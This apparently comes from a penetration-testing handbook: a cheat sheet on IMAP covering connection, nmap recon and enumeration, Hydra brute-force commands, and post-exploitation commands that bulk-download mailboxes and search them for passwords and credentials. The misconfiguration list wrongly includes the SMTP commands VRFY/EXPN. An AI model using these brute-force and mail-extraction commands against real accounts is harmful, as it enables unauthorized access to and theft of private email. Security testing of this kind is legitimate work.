# IMAP

**`Default Ports: 143 (IMAP), 993 (IMAPS)`**

**Internet Message Access Protocol (IMAP)** is a standard email protocol that stores email messages on a mail server and allows the end user to view and manipulate them as though they were stored locally on their device. Unlike POP3, IMAP synchronizes email across multiple devices and allows management of email directly on the server.

### Connect <a href="#connect" id="connect"></a>

#### Using Telnet <a href="#using-telnet" id="using-telnet"></a>

Connect to IMAP servers using telnet for manual testing and interaction.

```
# Connect to IMAP server
telnet target.com 143

# Basic IMAP conversation
a1 LOGIN username password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
a5 LOGOUT
```

#### Using openssl (IMAPS) <a href="#using-openssl-imaps" id="using-openssl-imaps"></a>

Connect to IMAP servers using SSL/TLS encryption for secure communication.

```
# Connect with SSL
openssl s_client -connect target.com:993 -crlf -quiet

# IMAP commands
a1 LOGIN username password
a2 LIST "" "*"
a3 LOGOUT
```

#### Using curl <a href="#using-curl" id="using-curl"></a>

Use curl for automated IMAP access and email retrieval.

```
# List mailboxes
curl -u username:password imap://target.com/

# Read specific email
curl -u username:password imap://target.com/INBOX -X "FETCH 1 BODY[]"

# IMAPS
curl -u username:password imaps://target.com/ --insecure
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to detect IMAP mail servers and identify server versions:

```
nmap -p 143,993 -sV target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Identify IMAP server software and version through banner grabbing.

**Using netcat**

```
# Using netcat
nc target.com 143
```

**Using telnet**

```
# Using telnet
telnet target.com 143
```

**Using nmap**

```
# Using nmap
nmap -p 143 -sV target.com
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Capability Enumeration <a href="#capability-enumeration" id="capability-enumeration"></a>

IMAP servers advertise their supported features and authentication methods through the CAPABILITY command.

```
# Get server capabilities
telnet target.com 143
a1 CAPABILITY

# Response shows supported features:
# - AUTH methods (PLAIN, LOGIN, CRAM-MD5)
# - STARTTLS support
# - IDLE support
# - Other extensions
```

#### Advanced IMAP Enumeration <a href="#advanced-imap-enumeration" id="advanced-imap-enumeration"></a>

Use specialized Nmap scripts for detailed IMAP server analysis.

**Using imap-capabilities Script**

```
# Enumerate server capabilities
nmap -p 143 --script imap-capabilities target.com
```

**Using imap-ntlm-info Script**

```
# Extract NTLM authentication details
nmap -p 143 --script imap-ntlm-info target.com
```

**Using All IMAP Scripts**

```
# Run all IMAP-related scripts
nmap -p 143,993 --script imap-* target.com
```

#### Mailbox Enumeration <a href="#mailbox-enumeration" id="mailbox-enumeration"></a>

After successful authentication, you can enumerate mailboxes, folders, and message counts.

```
# List all mailboxes
a1 LOGIN username password
a2 LIST "" "*"

# List folders
a3 LIST "" "INBOX.*"

# Check mailbox status
a4 STATUS INBOX (MESSAGES RECENT UNSEEN)

# Select mailbox
a5 SELECT INBOX
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Brute Force <a href="#brute-force" id="brute-force"></a>

Brute forcing IMAP credentials can reveal weak email account passwords.

**Using Hydra**

```
# IMAP (plaintext)
hydra -l user@target.com -P passwords.txt imap://target.com

# IMAPS (SSL/TLS)
hydra -l user@target.com -P passwords.txt imaps://target.com:993

# Multiple users
hydra -L users.txt -P passwords.txt imap://target.com
```

**Using Nmap**

```
nmap -p 143 --script imap-brute target.com
```

#### Pass-the-Hash <a href="#pass-the-hash" id="pass-the-hash"></a>

Exploit NTLM authentication to use password hashes instead of plaintext passwords.

```
# If NTLM auth is supported
# Connect with NTLM hash instead of password
# Check with:
nmap -p 143 --script imap-ntlm-info target.com
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Email Extraction <a href="#email-extraction" id="email-extraction"></a>

Extract emails and sensitive information from compromised IMAP accounts.

**Read and Search Emails**

```
# Read all emails
a1 LOGIN username password
a2 SELECT INBOX
a3 FETCH 1:* (BODY[])

# Search for specific content
a4 SEARCH SUBJECT "password"
a5 SEARCH FROM "admin@target.com"
a6 SEARCH TEXT "confidential"
```

**Download Emails**

```
# Download all emails with curl
for i in {1..100}; do
  curl -u username:password "imap://target.com/INBOX;UID=$i" > email_$i.eml
done
```

#### Sensitive Information <a href="#sensitive-information" id="sensitive-information"></a>

Search for sensitive information and credentials in email content.

**Keyword Search**

```
# Search for keywords
SEARCH TEXT "password"
SEARCH TEXT "credential"
SEARCH TEXT "confidential"
SEARCH SUBJECT "reset"
```

**Advanced Search**

```
# Search by date
SEARCH SINCE 01-Jan-2024

# Combined search
SEARCH FROM "admin" SUBJECT "password"
```

### Common IMAP Commands <a href="#common-imap-commands" id="common-imap-commands"></a>

| Command      | Description       | Usage                        |
| ------------ | ----------------- | ---------------------------- |
| `CAPABILITY` | List capabilities | `a1 CAPABILITY`              |
| `LOGIN`      | Authenticate      | `a1 LOGIN user pass`         |
| `LIST`       | List mailboxes    | `a1 LIST "" "*"`             |
| `SELECT`     | Select mailbox    | `a1 SELECT INBOX`            |
| `FETCH`      | Retrieve messages | `a1 FETCH 1 BODY[]`          |
| `SEARCH`     | Search messages   | `a1 SEARCH TEXT "keyword"`   |
| `STORE`      | Modify flags      | `a1 STORE 1 +FLAGS \Deleted` |
| `LOGOUT`     | Close session     | `a1 LOGOUT`                  |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool              | Description            | Primary Use Case  |
| ----------------- | ---------------------- | ----------------- |
| telnet            | Terminal client        | Manual testing    |
| openssl s\_client | SSL/TLS client         | IMAPS connection  |
| curl              | Transfer tool          | Automated access  |
| Hydra             | Password cracker       | Brute force       |
| Nmap              | Network scanner        | Service detection |
| Metasploit        | Exploitation framework | Automated testing |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No encryption (port 143)
* ❌ Weak passwords
* ❌ VRFY/EXPN enabled
* ❌ No rate limiting
* ❌ Plaintext authentication allowed
* ❌ No account lockout
* ❌ Outdated IMAP server
* ❌ No TLS required
* ❌ Information disclosure

<br>
